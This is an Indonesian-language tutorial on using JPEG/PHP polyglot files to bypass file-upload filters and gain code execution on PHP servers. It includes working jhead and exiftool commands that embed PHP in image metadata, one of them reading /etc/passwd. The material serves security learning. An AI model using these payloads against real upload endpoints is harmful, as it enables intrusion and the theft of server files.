# Eksploitasi File Upload Vulnerability dengan Polyglot
#fileupload #rce #php

## Apa itu Polyglot?
Polyglot di dalam cyber security berarti file yang valid dalam beberapa bentuk format. Teknik polyglot ini dapat digunakan untuk menembus filtering dari aplikasi, terutama yang menggunakan filtering berbasis format file.  

Dalam konteks eksploitasi pada web berbasis PHP, bisa saja ada sebuah file yang valid sebagai  gambar JPEG dan juga valid sebagai file PHP atau PHAR (PHP ARchive) secara bersamaan. Hal ini dapat menimbulkan resiko yang sama dengan file upload vulnerability, yaitu remote code execution.

## Bagaimana Aplikasi Menentukan Sebuah File?
Berikut ini adalah cara aplikasi untuk menentukan sebuah file:

- **Ekstensi**, membaca file berdasarkan ekstensi filenya. Contoh `kucing.jpeg` adalah sebuah gambar, jika dilihat dari ekstensi `jpeg`-nya. Namun cara pembacaan ini kurang terpercaya, karena bisa saja sebuah file video dinamai dengan ekstensi `.pdf` misalkan. (Hayoo ngaku :p).
  
- **Magic Number**, pada Linux, teknik membaca file dilakukan dengan melihat magic numbernya. Magic number ini terletak pada bagian header awal dari sebuah file. Pada linux, kamu bisa menggunakan `hexdump` untuk membaca magic number. Contoh format file dan magic numbernya adalah:
	- PNG: `89 50 4E 47 0D 0A 1A 0A`
	- JPEG: `FF D8`. diakhiri dengan `FF D9`
	- PDF: `25 50 44 46`

## Membuat File Polyglot untuk Eksploitasi
### Image & PHP
Kita dapat menggunakan `jhead` (khusus untuk file jpg) untuk mengubah data exif dari file. Apabila pada mesin belum terdapat jhead, gunakan perintah `sudo apt install jhead` untuk menginstallnya.  

Perintah `__halt_compiler()` digunakan untuk menghetikan parse dari sisa file JPG. Kemudian agar file tersebut dibaca sebagai php, kita bisa menggunakan penamaan `file.jpg.php`.
```shell
# mengubah isi comment dari file.jpg
jhead -ce file.jpg

# melakukan edit header
<?php echo 'Hello, world!'; __halt_compiler(); ?>

# mengubah nama file menjadi ekstensi php (opsional - sesuai kebutuhan)
mv file.jpg file.jpg.php

# melihat jenis file
file file.jpg.php
```
.  

Kita juga bisa menggunakan tool [exiftool](https://www.poftut.com/how-to-install-and-use-exiftool-in-linux-windows-kali-ubuntu-mint-with-examples/). Pada Debian, cara untuk menginstall exiftool adalah `sudo apt install libimage-exiftool-perl`.  

Payload yang kita gunakan adalah untuk membaca file sensitif pada server.
```shell
# membaca metadata dengan exiftool
exiftool file.png

# mengubah metadata dengan exiftool kemudian menyimpannya sebagai polyglot file.jpg.php. Bagian "-Comment" dapat diubah sesuai keinginan.
exiftool -Comment="<?php echo 'MULAI ' . file_get_contents('/etc/passwd') . ' SELESAI'; ?>"  file.jpg -o file.jpg.php

```

## Referensi
- https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a#:~:text=Polyglots%2C%20in%20a%20security%20context,protection%20based%20on%20file%20types.
- https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
- Polyglot JS & JPEG https://systemweakness.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a
- Nice reference about polyglot https://github.com/mindcrypt/polyglot
- https://systemweakness.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a
- https://onestepcode.com/injecting-php-code-to-jpg/
- Forensik vs Polyglot https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/hiding-php-code-in-image-files-revisited/
- Another Forensik vs Polyglot https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/hiding-webshell-backdoor-code-in-image-files/